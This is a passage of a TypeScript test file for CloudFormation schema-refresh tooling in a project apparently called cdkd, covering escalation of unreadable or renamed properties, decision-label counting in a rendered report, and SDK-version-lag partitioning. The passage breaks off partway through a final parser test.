    // way `handledProperties` does.
    //
    // The assertion is inverted from what it was: this used to require the
    // escalation to read "names it in a declaration list but wires it nowhere",
    // which is a CONCLUSION the evidence does not support — the reader of a
    // refusal must be told the check could not see the wiring, not that there
    // is none. See `AWS::SQS::Queue.DelaySeconds` in the classifier suite.
    withScratchRoot({ bogusTolerated: {} }, (root, backfill) => {
      const rel = 'src/provisioning/providers/probe-provider.ts';
      writeFileSync(
        join(root, rel),
        [
          "import { Route53Client } from '@aws-sdk/client-route-53';",
          'export class ProbeProvider {',
          "  handledProperties = new Set(['GeoProximityLocation']);",
          '  client = Route53Client;',
          '}',
          '',
        ].join('\n')
      );
      const before = readFileSync(backfill);
      const result = writeAutoTolerated(
        [
          {
            resourceType: 'AWS::Route53::HostedZone',
            properties: ['GeoProximityLocation'],
            candidates: {},
          },
        ],
        new Map([['AWS::Route53::HostedZone', rel]]),
        root
      );
      expect(result.written).toEqual([]);
      expect(result.escalated[0]!.reason).toContain('COULD NOT DETERMINE');
      expect(result.escalated[0]!.reason).not.toContain('wires it nowhere');
      expect(result.escalated[0]!.reason).not.toContain('cleanup');
      expect(readFileSync(backfill).equals(before)).toBe(true);
    });
  }, 60_000);

  it('escalates a rename the CURRENT schema carries, with no addition in this delta', () => {
    // The cross-cycle plumbing, end to end and on the real pair the feature was
    // built around: `AWS::AutoScaling::AutoScalingGroup` already carries
    // `Cooldown` in the committed fixture while `DefaultCooldown` is the
    // removal — so the addition landed on an earlier day and `renameCandidates`
    // for this delta is EMPTY. Only `writeAutoTolerated` reading the type's
    // current schema can see the pair, which is why the case runs through it
    // rather than through `classifyRemovedProperty`.
    //
    // The property list is copied from the committed fixture rather than
    // fabricated, so if AWS ever re-splits these names the case fails instead
    // of asserting against a shape that no longer exists.
    const committedAsg = JSON.parse(
      readFileSync(
        join(REPO_ROOT, 'tests/fixtures/cfn-schemas/AWS-AutoScaling-AutoScalingGroup.json'),
        'utf8'
      )
    ) as { properties: string[] };
    expect(
      committedAsg.properties,
      'the schema no longer carries the surviving half of the pair'
    ).toContain('Cooldown');
    expect(
      committedAsg.properties,
      'the schema carries BOTH names, so nothing here is a removal'
    ).not.toContain('DefaultCooldown');

    const ENTRY = [
      {
        resourceType: 'AWS::AutoScaling::AutoScalingGroup',
        properties: ['DefaultCooldown'],
        candidates: {},
      },
    ];
    const PROVIDERS = new Map([['AWS::AutoScaling::AutoScalingGroup', ASG_PROVIDER]]);

    withScratchRoot({ bogusTolerated: {} }, (root, backfill) => {
      const before = readFileSync(backfill);
      // Control FIRST, with the type's schema absent from the scratch root. It
      // SETTLES — every other test passes, because `@aws-sdk/client-auto-scaling`
      // declares `DefaultCooldown` on `CreateAutoScalingGroupType` and the
      // provider reads it. So the schema read is the ONLY thing standing between
      // this property and an automatic tolerance, which is a stronger control
      // than "it fails on some other arm": the arm under test is the arm that
      // decides.
      //
      // (This control asserted the opposite until the input-root suffixes grew
      // `Type` / `Message`. Before that, the whole query-protocol family was
      // unreachable, and the case passed for a reason that had nothing to do
      // with renames.)
      const blind = writeAutoTolerated(ENTRY, PROVIDERS, root);
      expect(
        blind.written.map((w) => w.property),
        'the control no longer settles, so the rename verdict below proves nothing'
      ).toEqual(['DefaultCooldown']);
      expect(blind.escalated, JSON.stringify(blind)).toEqual([]);
      // The control WROTE, so the tolerance file must be reset before the real
      // arm runs — an existing entry is never overwritten, which would make the
      // second call a no-op that trivially "escalates nothing".
      writeFileSync(backfill, before);

      writeFileSync(
        join(root, 'tests/fixtures/cfn-schemas/AWS-AutoScaling-AutoScalingGroup.json'),
        JSON.stringify(committedAsg, null, 2)
      );
      const result = writeAutoTolerated(ENTRY, PROVIDERS, root);
      expect(result.written).toEqual([]);
      expect(result.escalated[0]!.reason, JSON.stringify(result)).toContain('RENAME');
      expect(result.escalated[0]!.reason).toContain('`Cooldown`');
      expect(readFileSync(backfill).equals(before)).toBe(true);
    });
  }, 60_000);

  it('escalates when the evidence cannot be READ, instead of aborting the refresh', () => {
    // A malformed checkout must not take down the refresh it is describing —
    // the refresh has already rewritten the fixtures by the time this runs, so
    // a throw here loses the whole cycle's work over one unreadable input. The
    // property escalates, which is where it would have gone anyway.
    //
    // The unreadable input is the SDK typings: a directory sitting where
    // `models_0.d.ts` belongs, so `collectSdkInterfaces` raises EISDIR from
    // inside the classification. It is fabricated because there is no way to
    // corrupt the real symlinked `node_modules` without corrupting it for every
    // other case in the file.
    const root = mkdtempSync(join(tmpdir(), 'cdkd-auto-tolerated-unreadable-'));
    const committed = join(REPO_ROOT, 'tests/fixtures/cfn-schemas/_todo-backfill.json');
    const before = readFileSync(committed);
    try {
      mkdirSync(join(root, 'tests/fixtures/cfn-schemas'), { recursive: true });
      mkdirSync(join(root, 'src/provisioning/providers'), { recursive: true });
      const backfill = join(root, 'tests/fixtures/cfn-schemas/_todo-backfill.json');
      writeFileSync(backfill, `${JSON.stringify({ bogusTolerated: {} }, null, 2)}\n`);

      const CLIENT = '@aws-sdk/client-cdkdprobe';
      const pkg = join(root, 'node_modules', CLIENT);
      mkdirSync(join(pkg, 'dist-types/models/models_0.d.ts'), { recursive: true });
      writeFileSync(join(pkg, 'package.json'), JSON.stringify({ version: '3.0.0' }));
      const rel = 'src/provisioning/providers/probe-provider.ts';
      writeFileSync(
        join(root, rel),
        [`import { X } from '${CLIENT}';`, "const v = properties['Thing'];", ''].join('\n')
      );

      const result = writeAutoTolerated(
        [{ resourceType: 'AWS::Cdkdprobe::Thing', properties: ['Thing'], candidates: {} }],
        new Map([['AWS::Cdkdprobe::Thing', rel]]),
        root
      );
      expect(result.written).toEqual([]);
      expect(result.escalated).toHaveLength(1);
      expect(result.escalated[0]!.reason).toContain('the evidence could not be read');
      // The failure is CARRIED, not swallowed into a generic sentence: a reader
      // has to be able to tell an unreadable checkout from a real verdict.
      expect(result.escalated[0]!.reason).toContain('EISDIR');
      expect(result.escalated[0]!.reason).toContain('nothing is concluded about this property');
      expect(readFileSync(backfill, 'utf8')).toBe(
        `${JSON.stringify({ bogusTolerated: {} }, null, 2)}\n`
      );
    } finally {
      rmSync(root, { recursive: true, force: true });
      expect(
        readFileSync(committed).equals(before),
        'the case wrote to the COMMITTED tolerance file'
      ).toBe(true);
    }
  }, 60_000);
});

describe('the decision labels and the count cannot disagree', () => {
  // The PR that motivated this said "5 decisions needed" in its title over
  // four nested-key divergences and one failed check, rendered in two
  // differently-shaped sections with no counts and no numbering — so the
  // number a reader sees first could not be reached from the body at all.
  //
  // The labels run straight through the sections, and this is the fence that
  // keeps them honest: a section that stops labelling, or one that labels
  // something `countDecisions` does not count, is a body disagreeing with its
  // own title. That is the exact class this file keeps finding elsewhere.
  const REMOVED = {
    resourceType: 'AWS::S3::Bucket',
    properties: ['Gone', 'AlsoGone'],
    candidates: {},
    sdk: {},
  };
  const DIVERGENCE = {
    resourceType: 'AWS::Glue::Connection',
    nestedKey: 'OAuth2Credentials',
    bucket: 'definition-member-missing',
    detail: 'd',
  };

  /** Every `Dn` the report emits, in order. */
  const labels = (md: string): number[] =>
    [...md.matchAll(/\*\*D(\d+)\.\*\*/g)].map((m) => Number(m[1]));

  const CASES: Array<[string, Record<string, unknown>]> = [
    ['removed only', { removed: [REMOVED], divergences: [] }],
    ['divergences only', { removed: [], divergences: [DIVERGENCE] }],
    ['failed checks only', { removed: [], divergences: [], failedChecks: ['property-coverage'] }],
    ['unparsed checker only', { removed: [], divergences: [], nestedKeyUnparsed: true }],
    ['unreadable only', { removed: [], divergences: [], unreadable: ['AWS-S3-Bucket.json'] }],
    [
      'every kind at once',
      {
        removed: [REMOVED],
        divergences: [DIVERGENCE, { ...DIVERGENCE, nestedKey: 'OtherKey' }],
        failedChecks: ['property-coverage', 'audit:sdk-attr-coverage:check'],
        nestedKeyUnparsed: true,
        unreadable: ['AWS-S3-Bucket.json'],
      },
    ],
    // The pending-bump section is COUNTED (one label per bump, not per
    // divergence) and it renders before the divergences section, so it is the
    // one place a running label can restart mid-report. Two bumps and three
    // divergences: a per-divergence label here would emit five where the title
    // says two.
    [
      'pending SDK bumps, grouped',
      {
        removed: [],
        divergences: [],
        pendingSdkBump: [
          {
            ...DIVERGENCE,
            client: '@aws-sdk/client-glue',
            installed: '3.1018.0',
            latest: '3.1127.0',
            definition: 'OAuth2Properties',
            member: 'OAuth2Credentials',
          },
          {
            ...DIVERGENCE,
            nestedKey: 'AuthorizationCodeProperties',
            client: '@aws-sdk/client-glue',
            installed: '3.1018.0',
            latest: '3.1127.0',
            definition: 'OAuth2Properties',
            member: 'AuthorizationCodeProperties',
          },
          {
            ...DIVERGENCE,
            resourceType: 'AWS::S3::Bucket',
            nestedKey: 'SomeKey',
            client: '@aws-sdk/client-s3',
            installed: '3.900.0',
            latest: '3.901.0',
            definition: 'PutBucketRequest',
            member: 'SomeKey',
          },
        ],
      },
    ],
    [
      'pending SDK bumps beside a divergence that stayed',
      {
        removed: [],
        divergences: [DIVERGENCE],
        pendingSdkBump: [
          {
            ...DIVERGENCE,
            nestedKey: 'AuthorizationCodeProperties',
            client: '@aws-sdk/client-glue',
            installed: '3.1018.0',
            latest: '3.1127.0',
            definition: 'OAuth2Properties',
            member: 'AuthorizationCodeProperties',
          },
        ],
      },
    ],
    // The NON-decision sections, present so a stray label in one breaks the
    // sequence. Without them a probe that numbered the auto-settled list — the
    // direction where the body claims MORE decisions than the title — passed
    // every case: the fence only saw sections that were already labelled.
    [
      'beside the sections that must NOT be labelled',
      {
        removed: [],
        divergences: [DIVERGENCE],
        autoTolerated: [
          {
            resourceType: 'AWS::Route53::RecordSet',
            property: 'GeoProximityLocation',
            rationale: 'settled by the job',
          },
        ],
        // The standing-tolerance section is a non-decision section too, added
        // here with the others: it was introduced without joining this list, so
        // a stray label in it would not have broken the sequence (issue
        // go-to-k/cdkd#3005).
        alreadyTolerated: [
          {
            resourceType: 'AWS::AutoScaling::AutoScalingGroup',
            property: 'DefaultCooldown',
            rationale: 'settled by a standing entry',
          },
        ],
        autoEscalated: [
          { resourceType: 'AWS::SQS::Queue', property: 'DelaySeconds', reason: 'could not tell' },
        ],
        writableAdded: [{ resourceType: 'AWS::S3::Bucket', properties: ['NewOne'] }],
        skipped: ['AWS::Foo::Bar'],
      },
    ],
  ];

  for (const [name, extra] of CASES) {
    it(`labels exactly as many decisions as it counts — ${name}`, () => {
      const input = { writableAdded: [], skipped: [], ...extra };
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const n = countDecisions(input as any);
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      const md = renderDiagnosis(input as any);
      const seen = labels(md);
      expect(n, `${name}: the case exercises no decision at all`).toBeGreaterThan(0);
      expect(seen, `${name}: a section stopped labelling, or labelled twice`).toEqual(
        Array.from({ length: n }, (_, i) => i + 1)
      );
      // And the index line a reader lands on first names the same range.
      expect(md).toContain(`labelled **D1**–**D${n}**`);
    });
  }

  it('says nothing about labels when there is nothing to decide', () => {
    const md = renderDiagnosis({ removed: [], divergences: [], writableAdded: [], skipped: [] });
    expect(md).toContain('Nothing in this refresh needs a decision');
    expect(labels(md), 'a label was emitted with no decision behind it').toEqual([]);
    expect(md).not.toContain('labelled **D1**');
  });

  it('gives every decision SECTION a count in its heading', () => {
    // The settled and added sections already carried one; the decision ones did
    // not, so the reader could not even total the sections up, let alone the
    // items. Asserted as a property of the headings rather than a list, so a
    // new decision section cannot ship without one.
    const md = renderDiagnosis({
      removed: [REMOVED],
      divergences: [DIVERGENCE],
      failedChecks: ['property-coverage'],
      writableAdded: [],
      skipped: [],
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
    } as any);
    const decisionHeadings = md
      .split('\n')
      .filter((l) => l.startsWith('### ') && l.includes('a decision is needed'));
    expect(decisionHeadings.length, 'no decision section rendered').toBeGreaterThan(0);
    for (const h of decisionHeadings) {
      expect(h, `decision section without a count: ${h}`).toMatch(/\(\d+\)/);
    }
  });
});

/**
 * The SDK-lag partition — issue go-to-k/cdkd#2819.
 *
 * go-to-k/cdkd#2784 escalated four `AWS::Glue::Connection` divergences while its
 * own body reported `@aws-sdk/client-glue` at 3.1018.0 against a registry
 * publishing 3.1127.0, and told the maintainer to bump and re-check by hand.
 *
 * **Those four are NOT SDK lag** — measured against the published tarballs, the
 * client declares none of the members on those interfaces at either version, so
 * the bump-and-recheck loop ends in no change. That is the point rather than a
 * caveat: the partition answers the question either way, and the negative answer
 * is the one it produced for the case that motivated it. A real instance of the
 * settling direction exists in `@aws-sdk/client-codebuild`, where
 * `ProjectEnvironment.hostKernel` is absent at 3.1018.0 and present at 3.1126.0.
 *
 * Two failure directions bound every case here, and they pull opposite ways:
 *
 * - Settling something the published client does NOT resolve would drop a real
 *   silent-drop finding out of the report.
 * - Settling on the NAME rather than on the interface would contradict the
 *   checker — `sdkVersionLag`'s comment records the measurement that those same
 *   four names are present in both clients.
 *
 * So the fixtures below are interface-shaped, and the negative arms carry the
 * name in a place the interface-scoped question must refuse.
 */
describe('partitionPendingSdkBump', () => {
  const detailFor = (definition: string, member: string) =>
    `SDK interface \`${definition}\` has no \`${member}\` member`;

  const glueDivergence = (nestedKey: string, definition = 'AuthenticationConfiguration') => ({
    resourceType: 'AWS::Glue::Connection',
    nestedKey,
    bucket: 'definition-member-missing',
    detail: detailFor(definition, nestedKey),
  });

  const GLUE_LAG = {
    resourceType: 'AWS::Glue::Connection',
    client: '@aws-sdk/client-glue',
    installed: '3.1018.0',
    latest: '3.1127.0',
    behind: true,
    matched: true,
  };

  /** An index shaped exactly like `collectSdkInterfaces`'s output. */
  const index = (spec: Record<string, string[]>) =>
    new Map(
      Object.entries(spec).map(([iface, members]) => [
        iface,
        new Map(members.map((m) => [m, { kind: 'scalar' as const }])),
      ])
    );

  const PUBLISHED_GLUE = index({
    AuthenticationConfiguration: [
      'AuthenticationType',
      'BasicAuthenticationCredentials',
      'CustomAuthenticationCredentials',
    ],
    OAuth2Properties: ['OAuth2GrantType', 'AuthorizationCodeProperties', 'OAuth2Credentials'],
  });

  it('settles every finding a published client resolves, and groups them into one bump', () => {
    const divergences = [
      glueDivergence('BasicAuthenticationCredentials'),
      glueDivergence('CustomAuthenticationCredentials'),
      glueDivergence('AuthorizationCodeProperties', 'OAuth2Properties'),
      glueDivergence('OAuth2Credentials', 'OAuth2Properties'),
    ];
    const result = partitionPendingSdkBump({
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      divergences: divergences as any,
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      sdkLag: [GLUE_LAG] as any,
      publishedInterfaces: () => PUBLISHED_GLUE,
    });

    expect(result.divergences).toEqual([]);
    expect(result.pendingSdkBump.map((p) => p.nestedKey)).toEqual([
      'BasicAuthenticationCredentials',
      'CustomAuthenticationCredentials',
      'AuthorizationCodeProperties',
      'OAuth2Credentials',
    ]);
    // The bump the report will name, carried on every row.
    for (const p of result.pendingSdkBump) {
      expect(p.client).toBe('@aws-sdk/client-glue');
      expect(p.installed).toBe('3.1018.0');
      expect(p.latest).toBe('3.1127.0');
    }
    // Four findings, ONE thing to do.
    expect(pendingBumpGroups(result.pendingSdkBump)).toEqual([
      { client: '@aws-sdk/client-glue', installed: '3.1018.0', latest: '3.1127.0' },
    ]);
  });

  it('keeps a divergence the published client does not resolve either', () => {
    const result = partitionPendingSdkBump({
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      divergences: [glueDivergence('RetiredField')] as any,
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      sdkLag: [GLUE_LAG] as any,
      publishedInterfaces: () => PUBLISHED_GLUE,
    });
    expect(result.pendingSdkBump).toEqual([]);
    expect(result.divergences).toHaveLength(1);
    // And NOT unknown: the published client was read and it declared the
    // interface, so the answer is definitive. Listing it as unknown would send
    // the maintainer to bump-and-recheck a question already settled — the same
    // wasted loop the whole partition exists to remove, in reverse.
    expect(result.unresolved).toEqual([]);
  });

  it('asks the INTERFACE, not the name — a member on another interface settles nothing', () => {
    // The failure mode `sdkVersionLag`'s comment names: the name is present in
    // the published client, just not on the interface the finding is about. A
    // grep-level check would settle this and contradict the checker.
    const result = partitionPendingSdkBump({
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      divergences: [glueDivergence('OAuth2Credentials')] as any,
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      sdkLag: [GLUE_LAG] as any,
      publishedInterfaces: () => PUBLISHED_GLUE,
    });
    // `OAuth2Credentials` IS in the index — on `OAuth2Properties`, not on the
    // `AuthenticationConfiguration` the finding names.
    expect(PUBLISHED_GLUE.get('OAuth2Properties')?.has('OAuth2Credentials')).toBe(true);
    expect(result.pendingSdkBump).toEqual([]);
    expect(result.divergences).toHaveLength(1);
  });

  it('leaves a no-sdk-member finding alone and downloads nothing for it', () => {
    // It carries no detail, because it is a member-index question over the
    // whole client rather than an interface-scoped one. There is no question to
    // re-ask, so re-asking anything would be inventing one.
    let fetches = 0;
    const result = partitionPendingSdkBump({
      divergences: [
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        { resourceType: 'AWS::Glue::Connection', nestedKey: 'IPV6Enabled', bucket: 'no-sdk-member', detail: '' } as any,
      ],
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      sdkLag: [GLUE_LAG] as any,
      publishedInterfaces: () => {
        fetches += 1;
        return PUBLISHED_GLUE;
      },
    });
    expect(result.divergences).toHaveLength(1);
    expect(fetches, 'a bucket with no question to re-ask still triggered a download').toBe(0);
  });

  it('settles nothing for a bucket that is not definition-member-missing, however the detail reads', () => {
    // The bucket gate is not redundant with the parse. Today the key pass emits
    // no detail, so the parse alone would refuse — but a producer that later
    // gave `no-sdk-member` the same sentence would start settling findings whose
    // question is a member-index one over the whole client, which this evidence
    // does not answer. The gate is what holds then, and only a case shaped like
    // that future can hold the gate.
    const result = partitionPendingSdkBump({
      divergences: [
        {
          resourceType: 'AWS::Glue::Connection',
          nestedKey: 'BasicAuthenticationCredentials',
          bucket: 'no-sdk-member',
          detail: detailFor('AuthenticationConfiguration', 'BasicAuthenticationCredentials'),
          // eslint-disable-next-line @typescript-eslint/no-explicit-any
        } as any,
      ],
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      sdkLag: [GLUE_LAG] as any,
      publishedInterfaces: () => PUBLISHED_GLUE,
    });
    expect(result.pendingSdkBump).toEqual([]);
    expect(result.divergences).toHaveLength(1);
  });

  it('stops at the client that declares the interface rather than shopping for a better answer', () => {
    // Two clients declare `AuthenticationConfiguration`; the first — the type's
    // OWN, tried first — does not carry the member. That first answer IS the
    // finding. Reading on until some client agrees would settle a real
    // divergence against a client that does not serve this type.
    const asked: string[] = [];
    const result = partitionPendingSdkBump({
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      divergences: [glueDivergence('BasicAuthenticationCredentials')] as any,
      sdkLag: [
        GLUE_LAG,
        { ...GLUE_LAG, client: '@aws-sdk/client-other', matched: false, latest: '1.0.0' },
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
      ] as any,
      publishedInterfaces: (client) => {
        asked.push(client);
        return client === '@aws-sdk/client-glue'
          ? index({ AuthenticationConfiguration: ['AuthenticationType'] })
          : index({ AuthenticationConfiguration: ['BasicAuthenticationCredentials'] });
      },
    });
    expect(result.pendingSdkBump).toEqual([]);
    expect(result.divergences).toHaveLength(1);
    expect(asked, 'kept asking past the client that declared the interface').toEqual([
      '@aws-sdk/client-glue',
    ]);
  });

  it('downloads nothing when the installed client is already current', () => {
    let fetches = 0;
    const result = partitionPendingSdkBump({
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      divergences: [glueDivergence('BasicAuthenticationCredentials')] as any,
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      sdkLag: [{ ...GLUE_LAG, installed: '3.1127.0', behind: false }] as any,
      publishedInterfaces: () => {
        fetches += 1;
        return PUBLISHED_GLUE;
      },
    });
    // Nothing to bump, so the SDK-lag reading was already eliminated upstream
    // and the finding is the service's own.
    expect(result.divergences).toHaveLength(1);
    expect(fetches).toBe(0);
  });

  it('looks the member up under the SDK’s OWN spelling, not the CFn key', () => {
    // Six targets declare `keyStyle: 'lower-first'`, so the producer writes the
    // detail with a lowerFirst member while `nestedKey` keeps the CFn
    // capitalisation. Every other fixture here has member === nestedKey, which
    // leaves `members.has(asked.member)` indistinguishable from
    // `members.has(d.nestedKey)` — green, and wrong on all six.
    const result = partitionPendingSdkBump({
      divergences: [
        {
          resourceType: 'AWS::ECS::TaskDefinition',
          nestedKey: 'PortMappings',
          bucket: 'definition-member-missing',
          detail: detailFor('ContainerDefinition', 'portMappings'),
          // eslint-disable-next-line @typescript-eslint/no-explicit-any
        } as any,
      ],
      sdkLag: [
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
        { ...GLUE_LAG, resourceType: 'AWS::ECS::TaskDefinition', client: '@aws-sdk/client-ecs' } as any,
      ],
      // Declares ONLY the lowerFirst spelling, so a lookup by `nestedKey` misses.
      publishedInterfaces: () => index({ ContainerDefinition: ['portMappings', 'image'] }),
    });
    expect(result.pendingSdkBump).toHaveLength(1);
    expect(result.pendingSdkBump[0]!.member).toBe('portMappings');
    expect(result.pendingSdkBump[0]!.nestedKey).toBe('PortMappings');
  });

  it('escalates when the published typings could not be read, and says the reading is UNKNOWN', () => {
    const result = partitionPendingSdkBump({
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      divergences: [glueDivergence('BasicAuthenticationCredentials')] as any,
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      sdkLag: [GLUE_LAG] as any,
      publishedInterfaces: () => undefined,
    });
    // npm unreachable from CI is the ordinary way this happens, and the safe
    // direction is the finding staying visible.
    expect(result.pendingSdkBump).toEqual([]);
    expect(result.divergences).toHaveLength(1);
    // And it must be DISTINGUISHABLE from a finding the published client was
    // read for and did not resolve. Reporting both as "already ruled out" tells
    // the maintainer a check happened when npm was simply unreachable, and the
    // step it feeds ends in an allow-list entry.
    expect(result.unresolved).toHaveLength(1);
  });

  it('does not delegate to a fallback client when the type’s own one could not be read', () => {
    // The matched client fails to download and a fallback declares a same-named
    // interface carrying the name. Falling through would settle a real
    // divergence from a client `clientsForType` itself calls "may not be the
    // type's own" — a confident wrong answer, which is the one outcome this
    // report must not produce.
    const result = partitionPendingSdkBump({
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      divergences: [glueDivergence('BasicAuthenticationCredentials')] as any,
      sdkLag: [
        GLUE_LAG,
        { ...GLUE_LAG, client: '@aws-sdk/client-other', matched: false, latest: '1.0.0' },
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
      ] as any,
      publishedInterfaces: (client) =>
        client === '@aws-sdk/client-glue'
          ? undefined
          : index({ AuthenticationConfiguration: ['BasicAuthenticationCredentials'] }),
    });
    expect(result.pendingSdkBump).toEqual([]);
    expect(result.divergences).toHaveLength(1);
    expect(result.unresolved).toHaveLength(1);
  });

  it('ignores a lag row belonging to another resource type', () => {
    // The type predicate feeds all three of `rows`, `clientIsCurrent` and the
    // download, and every other case in this file uses a single type — so
    // dropping it (`const typeRows = sdkLag;`) survives them all. Live, a
    // foreign row makes the walk download an unrelated type's client and settle
    // from it, or mark the type current and suppress the unknown: the confident
    // wrong answer this partition exists to prevent.
    const asked: string[] = [];
    const result = partitionPendingSdkBump({
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      divergences: [glueDivergence('BasicAuthenticationCredentials')] as any,
      sdkLag: [
        {
          ...GLUE_LAG,
          resourceType: 'AWS::ECS::TaskDefinition',
          client: '@aws-sdk/client-ecs',
          latest: '3.900.0',
        },
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
      ] as any,
      publishedInterfaces: (client) => {
        asked.push(client);
        // Declares the interface AND the member — so if the foreign row were
        // consulted, the finding would settle.
        return PUBLISHED_GLUE;
      },
    });
    expect(asked, 'a foreign type’s client was downloaded').toEqual([]);
    expect(result.pendingSdkBump).toEqual([]);
    expect(result.divergences).toHaveLength(1);
    expect(result.unresolved).toHaveLength(1);
  });

  it('reports UNKNOWN when the type has no version row at all', () => {
    // `sdkVersionLag` degrades to `undefined` on any npm failure, and
    // `buildSdkLag` then emits NO ROW — so with npm unreachable, which the
    // rendered text itself calls the ordinary cause, every type loses its row at
    // once. Deciding off the `behind`-filtered list alone read that as "not
    // behind", reported nothing unknown, and left the procedure asserting a
    // check that never ran: the exact failure the return value was added for,
    // and it survived the first cut of it (measured — the mutation lived).
    const result = partitionPendingSdkBump({
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      divergences: [glueDivergence('BasicAuthenticationCredentials')] as any,
      sdkLag: [],
      // Resolves the finding, so a walk that ran at all would settle it rather
      // than report it unknown — which is what the `unresolved` assertion below
      // rests on. A download COUNTER was tried here and removed: with no rows,
      // no mutation of the type predicate can reach a fetch, so it fenced
      // nothing while reading as if it did. The counter is load-bearing in the
      // foreign-row case above, where a row does exist.
      publishedInterfaces: () => PUBLISHED_GLUE,
    });
    expect(result.divergences).toHaveLength(1);
    expect(result.unresolved).toHaveLength(1);
  });

  it('reports UNKNOWN when a lagging client was read but declares no such interface', () => {
    // Read fine, and the interface is not in it — so the question was never
    // ASKED, however successful the download was. The rendered line names this
    // cause alongside the unreadable one, which is why it says the reading could
    // not be SETTLED rather than "the client could not be read".
    const result = partitionPendingSdkBump({
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      divergences: [glueDivergence('BasicAuthenticationCredentials')] as any,
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      sdkLag: [GLUE_LAG] as any,
      publishedInterfaces: () => index({ SomethingElse: ['Whatever'] }),
    });
    expect(result.pendingSdkBump).toEqual([]);
    expect(result.divergences).toHaveLength(1);
    expect(result.unresolved).toHaveLength(1);
  });

  it('reports no unknown when the client is current, because the version answered it', () => {
    // With nothing behind, no lookup is owed: the version comparison already
    // eliminated the SDK-lag reading. Calling that UNKNOWN would send the
    // maintainer to bump a client that is already the latest.
    const result = partitionPendingSdkBump({
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      divergences: [glueDivergence('BasicAuthenticationCredentials')] as any,
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      sdkLag: [{ ...GLUE_LAG, installed: '3.1127.0', behind: false }] as any,
      publishedInterfaces: () => undefined,
    });
    expect(result.divergences).toHaveLength(1);
    expect(result.unresolved).toEqual([]);
  });

  it('tries the type’s own client before a fallback one', () => {
    // `clientsForType` falls back to EVERY client the provider imports, so a lag
    // row need not name the type's own service. The matched row is the one whose
    // answer is about this type, so it has to be asked first.
    const asked: string[] = [];
    partitionPendingSdkBump({
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      divergences: [glueDivergence('BasicAuthenticationCredentials')] as any,
      sdkLag: [
        { ...GLUE_LAG, client: '@aws-sdk/client-s3', matched: false, latest: '3.901.0' },
        GLUE_LAG,
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
      ] as any,
      publishedInterfaces: (client) => {
        asked.push(client);
        return client === '@aws-sdk/client-glue' ? PUBLISHED_GLUE : index({ PutObjectRequest: ['Key'] });
      },
    });
    expect(asked[0]).toBe('@aws-sdk/client-glue');
  });

  it('skips a client that does not declare the interface instead of reading it as absent', () => {
    // Both rows UNMATCHED, so the sort leaves them in order and the client that
    // never declared the shape is the one asked FIRST — which is the only
    // arrangement that reaches the skip at all. Ordered the other way the type's
    // own client answers immediately and the branch is never executed, so the
    // case passes while fencing nothing (measured: it did).
    //
    // Concluding "the member is gone" from a client that never declared the
    // shape would escalate a finding the real client resolves, and tell the
    // reader the service dropped a field it did not.
    const asked: string[] = [];
    const result = partitionPendingSdkBump({
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      divergences: [glueDivergence('BasicAuthenticationCredentials')] as any,
      sdkLag: [
        { ...GLUE_LAG, client: '@aws-sdk/client-s3', matched: false, latest: '3.901.0' },
        { ...GLUE_LAG, matched: false },
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
      ] as any,
      publishedInterfaces: (client) => {
        asked.push(client);
        return client === '@aws-sdk/client-glue' ? PUBLISHED_GLUE : index({ PutObjectRequest: ['Key'] });
      },
    });
    expect(asked, 'the non-declaring client was not tried first').toEqual([
      '@aws-sdk/client-s3',
      '@aws-sdk/client-glue',
    ]);
    expect(result.pendingSdkBump).toHaveLength(1);
    expect(result.pendingSdkBump[0]!.client).toBe('@aws-sdk/client-glue');
  });

  it('downloads each client at most once however many divergences ride on it', () => {
    const asked: string[] = [];
    partitionPendingSdkBump({
      divergences: [
        glueDivergence('BasicAuthenticationCredentials'),
        glueDivergence('CustomAuthenticationCredentials'),
        glueDivergence('AuthorizationCodeProperties', 'OAuth2Properties'),
        // eslint-disable-next-line @typescript-eslint/no-explicit-any
      ] as any,
      // eslint-disable-next-line @typescript-eslint/no-explicit-any
      sdkLag: [GLUE_LAG] as any,
      publishedInterfaces: (client, version) => {
        asked.push(`${client}@${version}`);
        return PUBLISHED_GLUE;
      },
    });
    // An SDK client tarball is several megabytes; one per finding would be four
    // downloads of the same file on a job that runs daily.
    expect(asked).toEqual(['@aws-sdk/client-glue@3.1127.0']);
  });
});

describe('parseDefinitionMemberMissing', () => {
  it('reads the interface and member out of the producer’s exact sentence', () => {
    // Byte-for-byte the string `gen-nested-key-coverage.ts`'s definition
    // sub-pass writes, backticks included.
    expect(
      parseDefinitionMemberMissing(
        'SDK interface `AuthenticationConfiguration` has no `BasicAuthenticationCredentials` member'
      )
    ).toEqual({
      definition: 'AuthenticationConfiguration',
      member: 'BasicAuthenticationCredentials',
    });
  });

  it('refuses a detail it does not fully recognise', () => {
    // Anchored end to end on purpose. A loose match would bind two identifiers
    // out of a REWORDED sentence and settle a finding from a question nobody
    // asked; refusing sends it to the maintainer, which is the safe direction.
    for (const detail of [
      '',
